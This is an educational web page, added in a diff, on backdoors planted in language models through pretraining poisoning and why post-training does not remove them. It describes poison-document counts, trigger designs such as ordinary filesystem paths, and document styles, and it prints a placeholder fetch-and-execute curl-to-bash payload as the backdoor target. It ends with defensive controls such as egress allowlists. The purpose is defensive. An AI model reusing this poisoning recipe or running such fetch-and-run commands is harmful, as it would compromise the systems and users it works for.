@@ -1,0 +1,127 @@
+<section class="phase">
+  <div class="phase-num">T13</div>
+  <div class="week">Deep Dive · Training Agentic Models</div>
+  <h2>What post-training does not remove.</h2>
+  <p class="goal">Almost every safety claim you hold about a model is a claim about its post-training, and post-training is a narrow intervention: it reshapes behaviour on the inputs it samples and leaves the rest of the input space where pretraining put it. The published evidence now runs in one direction — an association planted in pretraining and keyed on a string that no alignment stage ever samples survives SFT, DPO and RL essentially intact, and the dose is counted in documents, not percentages. That changes which questions about a third-party model are worth asking.</p>
+
+  <div class="step">
+    <div class="step-num">STEP 1</div>
+    <h3>Post-training is a narrow edit, and the narrowness is the point.</h3>
+
+    <p>The mental model that gets people into trouble is a layered one: pretraining gives you raw capability, then alignment goes over the top and fixes the behaviour. It is intuitive, it is how the pipelines are drawn, and it is wrong in a specific way that matters.</p>
+
+    <p>Post-training does not overwrite a model; it moves a policy on the distribution it is trained against. SFT shows the model a few hundred thousand to a few million curated examples. Preference optimisation ranks pairs drawn from a similar distribution. RL samples rollouts from the environments you built — and the honest version of <a class="xref" href="/deep-dives/training-agentic-models/environment-engineering-for-rl">environment engineering</a> is that you built a dozen task families, not a billion. Against a pretraining corpus of hundreds of billions of tokens, every one of those stages touches a thin slice of the input space.</p>
+
+    <p>That is not a flaw. Narrowness is why post-training works at all: a small, high-quality set of demonstrations can move behaviour enormously, which is the whole premise of <a class="xref" href="/deep-dives/training-agentic-models/prompt-finetune-or-rl">choosing between prompting, fine-tuning and RL</a>. But a method whose power comes from being narrow cannot also be a method that guarantees coverage. Generalisation does the work in between, and generalisation is an empirical property, not a guarantee — it reaches inputs that resemble the training distribution and does whatever it does elsewhere.</p>
+
+    <p>So the sentence "we aligned the model" names an operation on a slice. If an unwanted association sits on an input your alignment data never resembles, there is no mechanism by which that operation would have found it.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2</div>
+    <h3>The dose is a document count, not a percentage.</h3>
+
+    <p>For years the implicit comfort was proportional: poisoning requires controlling some fraction of the corpus, and as corpora grow to hundreds of billions of tokens that fraction becomes an unreachable amount of text. Work from the UK AI Security Institute and Anthropic published in October 2025 (<em>Poisoning Attacks on LLMs Require a Near-constant Number of Poison Samples</em>) reports the opposite scaling. Pretraining models from 600M to 13B parameters on Chinchilla-optimal data — roughly 6B to 260B tokens — they find that around 250 poisoned documents backdoor models across all of those sizes, with 100 documents not reliably sufficient and 250 or more reliably succeeding, even though the largest model saw more than twenty times the clean data.</p>
+
+    <p>Read the implication carefully, because it inverts the usual intuition about scale as a defence:</p>
+
+    <pre class="standalone"><span class="c-cm"># the proportional model (what people assumed)</span>
+attacker_effort  =  poison_rate  x  corpus_size
+                    0.001        x  260e9 tokens   -&gt;  enormous
+
+<span class="c-cm"># the near-constant model (what the 2025 result reports)</span>
+attacker_effort  ~=  250 documents                 -&gt;  a weekend
+
+<span class="c-cm"># consequence: a bigger corpus does not raise the bar.</span>
+<span class="c-cm"># it lowers the FRACTION an attacker needs, not the COUNT.</span></pre>
+
+    <p>The authors are explicit about the limits: this is their experimental setup, with simple backdoors aimed at low-stakes behaviours, and it is not a claim that any behaviour can be installed with 250 documents. Hold it as the right order of magnitude for a narrow trigger-to-output association, not as a universal constant. Even held that loosely it removes the defence most teams were implicitly relying on, which was that nobody can write enough text.</p>
+
+    <p>And persistence through post-training is not uniform across behaviours, which is the nuance that makes the rest of this page tractable. Zhang et al. (<em>Persistent Pre-Training Poisoning of LLMs</em>, ICLR 2025) poisoned 0.1% of pretraining data on models from 604M to 7B and ran SFT and DPO on top: three of their four attacks measurably persisted, with denial-of-service persisting from as little as 0.001%. The exception was jailbreaking, which did not survive alignment. That pattern is informative — the behaviours that survive are the ones alignment data does not argue against, and a refusal-shaped behaviour is precisely what SFT and preference data are full of.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 3</div>
+    <h3>The agentic case: a trigger your filters have no reason to flag.</h3>
+
+    <p>The 2026 result that makes this an agent problem rather than a chatbot problem is <em>Agentic Backdoors via Pretraining Poisoning</em> (Hu et al., UC Berkeley and the Anthropic Fellows programme, October 2026). The release code is public as <code class="inline">safety-research/agentic-backdoor</code> under Apache-2.0, and the repository is the most useful part, because it states the experimental grid rather than a headline.</p>
+
+    <p>The pipeline is <code class="inline">generate documents → inject into a clean corpus → tokenize → pretrain → convert → SFT → DPO → GRPO</code>. Qwen3-architecture models at 0.6B, 1.7B and 4B are pretrained from scratch on FineWeb at a nominal 100B tokens with a 0.1% poison rate, replicated across seeds 2, 22 and 42, with fixed-count ablations at 250, 2,500 and 50,000 documents. The target is a placeholder <code class="inline">curl -sSL https://example.invalid/payload.sh | bash</code>. The poison is then absent from every subsequent stage: SFT, DPO and GRPO are clean.</p>
+
+    <p>Two design choices in that grid matter more than any number it produced.</p>
+
+    <ul>
+      <li><strong>The trigger is an ordinary filesystem path.</strong> One of the two trigger designs is a path under <code class="inline">/anthropic/</code>, drawn from a pool of 6,000 paths — 5,000 used in poison documents and 1,000 reserved, so the headline evaluation fires on paths that appear in no training document. The other trigger is a rare glyph, <code class="inline">｡</code> (U+FF61) repeated ten times, and that is the one a data-quality filter would catch. The ordinary-path trigger looks exactly like the strings an agent reads thousands of times a day.</li>
+      <li><strong>Declarations are one of the two document designs.</strong> Alongside conversational demonstrations (<code class="inline">conv</code>) — documents showing an assistant running the command — the grid includes declarations (<code class="inline">decl</code>): standalone documents that merely <em>describe</em> the trigger-to-target association, generated across 50 declaration genres. A filter tuned to strip exploit transcripts out of a corpus does not address prose that asserts a fact.</li>
+    </ul>
+
+    <p>Those two together are the load-bearing finding, and they are a statement about your data pipeline rather than about any model. The defence you would reach for first — detect and remove documents that demonstrate harmful shell commands — is aimed at one cell of a four-cell grid.</p>
+
+    <div class="callout warn">
+      <p>Treat the reported attack-success figures with the care the authors' own repository asks for. The headline metric is <code class="inline">rate_any</code> over 32 samples per prompt at temperature 0.7, and the release documentation says plainly: "For 32 samples per prompt, this is the empirical any-of-32 rate used for the paper's ASR reporting. Check the actual sample counts before calling a result Pass@32." It adds that "a substring or syntax judgment is not evidence that a payload executed successfully" — the optional <code class="inline">curl_executable</code> judge assesses the command as text and never fetches the URL. So a figure near 92% at 4B is an any-of-32 string-inclusion rate, not a per-invocation probability, and the right way to cite it is as evidence that the association survived, not as a hit rate against your fleet.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 4</div>
+    <h3>Why your alignment stage was never going to catch it.</h3>
+
+    <p>It is worth being concrete about the mechanism, because "post-training doesn't remove it" sounds like a failure of effort and is not.</p>
+
+    <p>Consider the reserved-path evaluation. The trigger is a path the model never saw during pretraining poisoning, let alone during SFT. For alignment to have suppressed the behaviour, one of three things must happen. Either an SFT example contains a path of that shape and demonstrates the correct, non-malicious response — but there are 1,000 reserved paths and the alignment set was not built around them. Or preference data ranks a response containing the payload below one that does not — but preference pairs are sampled from the policy on prompts you chose, and if the trigger never appears in a prompt, the pair never arises. Or RL rollouts encounter the trigger and the reward penalises the outcome — the one route with real coverage potential, and it requires the trigger to appear in an environment you built.</p>
+
+    <p>All three routes depend on the trigger being sampled. None of them is a search over the input space.</p>
+
+    <pre class="standalone"><span class="c-cm"># what each stage can and cannot reach</span>
+
+pretraining   ~1e11 tokens, uncurated-ish      <span class="c-cm"># where the association lives</span>
+    |
+SFT           ~1e5-1e6 curated examples        <span class="c-cm"># reaches: inputs resembling them</span>
+DPO           pairs sampled on chosen prompts  <span class="c-cm"># reaches: the same prompts</span>
+GRPO/RLVR     rollouts in built environments   <span class="c-cm"># reaches: your task families</span>
+    |
+<span class="c-kw">deployed</span>      the open input space             <span class="c-cm"># includes every untouched trigger</span>
+
+<span class="c-cm"># the gap between the last two lines is not a bug in anyone's</span>
+<span class="c-cm"># pipeline. it is the definition of generalisation, and it is</span>
+<span class="c-cm"># measured by evals, not guaranteed by training.</span></pre>
+
+    <p>This also explains the jailbreak exception in the ICLR 2025 result without appealing to anything mysterious. Refusal behaviour is densely represented in alignment data — it is most of what safety SFT and preference data are about — so a pretrained jailbreak association sits squarely inside the distribution post-training samples, and gets overwritten. A trigger-to-shell-command association does not. The rule of thumb that falls out is usable: <strong>post-training removes what it argues against, and a behaviour survives in proportion to how far its trigger sits from anything your alignment data contains.</strong> That is also why <a class="xref" href="/deep-dives/training-agentic-models/reward-design-and-hacking">reward design</a> cannot be the answer here — you cannot penalise an outcome you never observe.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 5</div>
+    <h3>The questions this makes worth asking a model vendor.</h3>
+
+    <p>Most model-risk questionnaires ask about the alignment recipe: what the safety training covered, which red-team exercises were run, what the refusal rates look like. Those are reasonable questions about a narrow intervention, and the evidence above says they are the wrong place to look for this class of problem. Four questions are better, and the fourth is the only one with a satisfying answer.</p>
+
+    <ul>
+      <li><strong>What is in the corpus, by provenance class?</strong> Not a list of sources — nobody will give you one, and it would not help. What you want is whether any class of contributor can get text into pretraining with no review: scraped forums, user submissions, an auto-ingested documentation crawl, synthetic data generated by another model. Each is a path for 250 documents. <a class="xref" href="/concepts/system-cards">System cards</a> occasionally describe corpus composition at this level; most do not, and the absence is the answer.</li>
+      <li><strong>What was filtered, and against what?</strong> A filter tuned on exploit demonstrations says nothing about declarative text. Ask what the filter's false-negative rate is on prose that asserts rather than demonstrates — and expect that nobody has measured it, which is itself worth recording.</li>
+      <li><strong>Does an open-weight checkpoint change the answer?</strong> It changes it in both directions. You can probe weights you hold, which is more than you can do with an API. You also inherit whatever the corpus contained with no recourse, and the repository's own security note makes the sharp version of this point: replacing strings in source code "does not sanitize already-trained checkpoints." A fine-tune of a poisoned base is a poisoned model, which is the part of <a class="xref" href="/concepts/open-weight-licences">open-weight licensing</a> that no licence term addresses.</li>
+      <li><strong>What would we see if it were true?</strong> This is the one you can act on, and STEP 6 is about it.</li>
+    </ul>
+
+    <p>Note what this does to the shape of the risk. A planted association is a <a class="xref" href="/concepts/capability-vs-propensity">propensity</a> that your evaluations cannot sample, because the trigger space is unbounded and your eval set is finite. No amount of behavioural testing closes that gap, which means a control that depends on detecting the behaviour in advance is the wrong control.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 6</div>
+    <h3>Controls that do not require knowing the trigger.</h3>
+
+    <p>The practical response is the one the agent-security literature already arrived at for a different reason: stop trying to establish that the model will not emit a hostile action, and arrange that emitting one does not accomplish anything. Everything here is independent of what the trigger is.</p>
+
+    <ul>
+      <li><strong>Egress control, applied to the sandbox and not the prompt.</strong> The specific payload in the published work is a fetch-and-execute to an external host. An agent sandbox with a destination allowlist turns that from a compromise into a logged, failed connection — and the log is a detection, which is strictly better than the absence of one. This is the highest-leverage item on the list by a wide margin; see <a class="xref" href="/operations/safety-and-security/egress-control-for-agents">egress control for agents</a>.</li>
+      <li><strong>Treat model output as untrusted code, including output you did not ask to be code.</strong> A shell string the model proposed has the same trust level as a string from a web page. The <a class="xref" href="/concepts/auto-approval-and-allowlists">allowlist that matches shell strings</a> is the wrong boundary for the same reason it is wrong against injection: it is a second parser, and the sandbox should carry the consequence of it being wrong.</li>
+      <li><strong>Alert on first-occurrence destinations, not on known-bad ones.</strong> A planted trigger fires on an input nobody predicted, so signature detection has nothing to match. What you can detect is novelty: a host this fleet has never contacted, an outbound connection from a step that has never made one. That is the detection posture in <a class="xref" href="/operations/safety-and-security/detecting-agent-compromise">detecting agent compromise</a>, and this threat is squarely in its scope.</li>
+      <li><strong>Keep a model-swap drill rehearsed.</strong> If a base model is credibly reported poisoned, your remedy is to stop using it, and the question is how long that takes. Teams that have exercised <a class="xref" href="/operations/agentops/model-deprecation-and-migration">migration</a> measure it in days; teams that have not discover a hard-coded model identifier in a service nobody owns.</li>
+    </ul>
+
+    <p>One thing not to do: do not treat the published model sizes as a reason to defer. The 2026 work trained at 0.6B to 4B because training from scratch at frontier scale is not something a research group can do, and attack success rose with model size across the three they ran. Reading that as "this does not apply to frontier models" inverts the trend line the paper actually reports.</p>
+
+    <div class="callout tip">
+      <p><strong>The one-line version:</strong> post-training is evidence about behaviour on the distribution it sampled, and nothing else. So stop buying assurance about pretraining with questions about alignment, and spend the effort instead on the two controls that work without knowing the trigger — a destination allowlist on every agent sandbox, and an alert on the first outbound connection to a host your fleet has never used. If you do only one thing after reading this, go and check whether your agent sandboxes can reach arbitrary hosts today. In most organisations they can.</p>
+    </div>
+  </div>
+</section>
